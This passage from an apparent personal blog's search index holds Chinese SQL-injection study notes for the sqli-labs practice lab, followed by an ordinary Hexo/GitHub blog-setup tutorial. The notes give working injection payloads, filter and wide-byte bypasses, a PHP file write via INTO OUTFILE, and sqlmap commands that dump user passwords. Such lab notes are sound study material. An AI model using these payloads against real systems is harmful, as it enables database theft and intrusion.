class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-8/?id=1' and length(database())=8 --+</span><br><span class="line"><span class="meta">#</span><span class="bash">可接在 and 后</span></span><br><span class="line">stustr(database(),1,1)</span><br><span class="line">asciii(stustr(database(),1,1))=N</span><br></pre></td></tr></table></figure><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "注入点" --technique T --dbs</span><br></pre></td></tr></table></figure><blockquote><p>注解： T 基于时间 （sqlmap -h/hh 查询详细）</p><p>Techniques:<br> These options can be used to tweak testing of specific SQL     injection<br> techniques</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH    SQL injection techniques to use (default "BEUSTQ")</span><br></pre></td></tr></table></figure><p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p><p>默认情况下会测试所有的方式，可选择</p></blockquote><h3 id="mysql读写文件："><a href="#mysql读写文件：" class="headerlink" title="mysql读写文件："></a>mysql读写文件：</h3><p>读：</p><blockquote><p>前提：show global variables like “secure_file_priv”;</p><p><img src="mysqld_secure_file_priv.png" alt=""></p><p>修改my.ini </p><p><img src="null.png" alt=""></p><p><img src="null_no.png" alt=""></p><p>重启phpstudy.</p><p>select load_file(“f:\1.txt”)；</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,load_file(f:www\\Less-7\\flag.txt),3 --+</span><br></pre></td></tr></table></figure><p>写：</p><blockquote><p>前提：show variables like ‘%general%’;</p><p><img src="write-1.png" alt=""></p><p>查看其general_log 是否为 OFF。</p><p>若是，则修改为 on 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br></pre></td></tr></table></figure><p><img src="write_yes.png" alt=""></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &quot;f:www\\Less-7\\1.php&quot; --+</span><br><span class="line"></span><br><span class="line">127.0.0.1\Less-7\1.php #查看是否写入成功</span><br></pre></td></tr></table></figure><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -hh</span><br><span class="line">sqlmap -u "注入点" --file-read "文件路经"</span><br><span class="line">4444 --file-write</span><br><span class="line">4444 --file-dest</span><br></pre></td></tr></table></figure><h3 id="post-基于报错"><a href="#post-基于报错" class="headerlink" title="post 基于报错"></a>post 基于报错</h3><blockquote><p>get与post的区别:注入点发生改变，post 无法在浏览器中查看与修改，但是可以用插件。</p></blockquote><p><code>burpsuite</code></p><p>burpsuite 抓取http数据包保存在文件中</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 文件路径 -p 指定探测参数</span><br></pre></td></tr></table></figure><h3 id="get报错注入-未完善"><a href="#get报错注入-未完善" class="headerlink" title="get报错注入(未完善)"></a>get报错注入(未完善)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure><blockquote><p>注解： 011011</p></blockquote><h3 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h3><p>大小写，编码，关键字屏蔽，内联注释</p><h3 id="post-基于时间和布尔值的盲注"><a href="#post-基于时间和布尔值的盲注" class="headerlink" title="post 基于时间和布尔值的盲注"></a>post 基于时间和布尔值的盲注</h3><p><code>burpsuite</code>抓取http报文</p><p>时间：… and (select (if (lenght (datebase() )&gt; 5,sleep(5),null))) –+ </p><p>布尔：… and (lenght (database() )&gt;5) –+</p><p><code>sqlmap</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">时间 ： sqlmap -r "文件路径" -p  参数   --technique T </span><br><span class="line">布尔：   sqlmap -r "文件路径" -p  参数   --technique B</span><br></pre></td></tr></table></figure><h3 id="http头中的注入"><a href="#http头中的注入" class="headerlink" title="http头中的注入"></a>http头中的注入</h3><p>在user-agent 和 referer 未被屏蔽时，可以进行注入</p><p><code>burpsuite</code></p><p>user-agent: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,version(),0x7e),1) or '1'='1</span><br></pre></td></tr></table></figure><p>referer:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (length(datebase())&gt;8) or if (1=1,sleep(5),null) or '1'='1</span><br></pre></td></tr></table></figure><h3 id="post-update语句的注入"><a href="#post-update语句的注入" class="headerlink" title="post_update语句的注入"></a>post_update语句的注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure><blockquote><p>注解： 1报错，执行”concat(0x7e,version(),0x7e)”做sql语句，替换报错内容，在报错中执行，最后输出。</p></blockquote><p>updatexml和extractvalue函数</p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>例：less-20</p><p><code>burpsuite</code></p><p>抓取，用” \ “判断闭合符号，之后 and 1=1,或 and \ or 加sql语句</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r "target.txt" --level 3 --batch </span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch --dbs</span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security --tables</span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security -T users --columns </span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p><code>burpsuite</code></p><p>首先截取，decoder 进行加密，例如：admin\ base64加密后为：YWRtaW5c</p><p>进行报错。</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r "target.txt" --level 3 --batch --tamper base64encode.py</span><br></pre></td></tr></table></figure><h3 id="绕过去除注释的sql注入"><a href="#绕过去除注释的sql注入" class="headerlink" title="绕过去除注释的sql注入"></a>绕过去除注释的sql注入</h3><p>注释符：  –+   –空格    #   /* 多行注释 */</p><p>preg_replace()函数来替换字符串或字符数组的莫些字符</p><p>例：less-23:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'3</span></span><br></pre></td></tr></table></figure><p> 注解：-1使前面的失效，union select 语句有效，-1和3旁边的单引号为一对，自动补充的单引号会加在最后，最后完成闭合。</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-23/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><p>…</p><h3 id="绕过去除and-or-的sql注入"><a href="#绕过去除and-or-的sql注入" class="headerlink" title="绕过去除and or 的sql注入"></a>绕过去除and or 的sql注入</h3><p>preg_replace()函数来替换字符串或字符数组的莫些字符</p><p>双写，内含注释，符号 （例：oorr,an/**/d,&amp;&amp;,||)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-25/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><h3 id="绕过去除空格的sql注入"><a href="#绕过去除空格的sql注入" class="headerlink" title="绕过去除空格的sql注入"></a>绕过去除空格的sql注入</h3><p>%09 :Tab </p><p>%0a ：换行</p><p>%20 ：空格 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-27/?id=100000000%27%09unIOn%09seLEct%091,version(),3%09||%09%271</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-27/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><h3 id="宽字节的注入"><a href="#宽字节的注入" class="headerlink" title="宽字节的注入"></a>宽字节的注入</h3><p>原理： GBK ：宽字节字符集的一种，Mysql默认字符集,</p><p>GBK占二字节，ASCII占一字节</p><p>php中编码为GBK，函数执行添加的是ASCII编码</p><p>%DF (常用)：会被php 中的addslashes 函数转义为” %DF\‘ “ ， 如果网站，mysql编码都为GBK，那么就会被转义为”%DF%5C%27”，”%DF%5C”其为一个宽字符，也就是“縗”。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-33/?id=-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-33/?id=1%df%27" --search --level 3 --risk 1 --thread 10</span><br></pre></td></tr></table></figure><p>其实，首字节ascii大于128，如129十进制转十六进制为0x81,然后写%81即可；</p><p>GBK 首字节对应(0x81-0xFE),尾字节对应 0x40-0xFE (0x7F除外)。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-32/?id=-1%81%27%20%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-32/?id=1" --tamper=unmagicquotes.py</span><br></pre></td></tr></table></figure><h3 id="Access偏移注入"><a href="#Access偏移注入" class="headerlink" title="Access偏移注入"></a>Access偏移注入</h3><p>公式：</p><p>工具：owasp-zap</p><p>access:小型数据库，只存在一个库，库内多个表。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>Hexo + Github 搭建 Blog 和 每次博客的部署</p><hr><a id="more"></a><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.安装git</p><p>git下载地址：<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">链接</a><br>安装后验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --version</span><br></pre></td></tr></table></figure><p>出现类似下面的版本号，皆为成功<br>git version 2.19.2.windows.1</p><p>2.安装node（其附带npm）</p><p>node.js下载地址：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">链接</a><br>安装后验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br></pre></td></tr></table></figure><p>出现类似下面的版本号(安装最新版本)：<br>v10.14.1</p><p>3.安装Hexo<br>命令行输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>4.创建本地运行库</p><p>创建本地仓库文件夹：例F:\github<br>右键点击该文件夹，Git Bash Here，命令行输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init myblog</span><br></pre></td></tr></table></figure><p>初始化完成！</p><h2 id="本地试运行"><a href="#本地试运行" class="headerlink" title="本地试运行"></a>本地试运行</h2><p>1.进入博客根目录（myblog）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> myblog</span><br></pre></td></tr></table></figure><p>2.安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>3.运行<br>本地运行(如果4000端口被占用，使用 hexo service -p 5000 修改端口)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>此时在浏览器输入 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> ,访问到博客界面 </p><h2 id="部署在远程库"><a href="#部署在远程库" class="headerlink" title="部署在远程库"></a>部署在远程库</h2><p>这里将其部署在github上</p><p>1.创建Github账户</p><p>略，随便百度一下</p><p>2.创建github项目</p><p>创建一个名为yourname.github.io的项目（yourname为你github名）</p><p>3.生成密钥，用于ssh连接</p><p>在本地，右键网站根目录，点击Git Bash 输入下列命令<br>yourname 即为github注册时的用户名<br>youremail 为注册时的邮箱账号<br>第三条命令生成密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"yourname"</span></span><br><span class="line">$ git config --global user.email <span class="string">"yourEmail"</span></span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">"yourEmail"</span></span><br></pre></td></tr></table></figure><p>此时在C:\Users下你的当前账户文件夹下会有一个 .ssh 文件，找到id_rsa.pub文件，复制里面的内容，粘贴至GitHub中（点击右上角用户头像下的Settings，之后点击左侧的SSH and GPG keys，找到New SSH key点击，输入title，并将之前复制的内容粘贴到下面的key中），最后点击Add SSH key，完成。</p><p>4.修改配置文件</p><p>去博客根目录下的_config.yml文件中，添加如下（yourname就是GitHub的用户名）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: git@github.com:yourname/yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>5.将本地仓库同步到github</p><p>在第一次生成以及部署之前，需要安装一个扩展：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>清除生成的静态网页缓存数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><p>生成文章对应的静态页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br></pre></td></tr></table></figure><p>部署本地站点到github命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 菜鸟互助 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
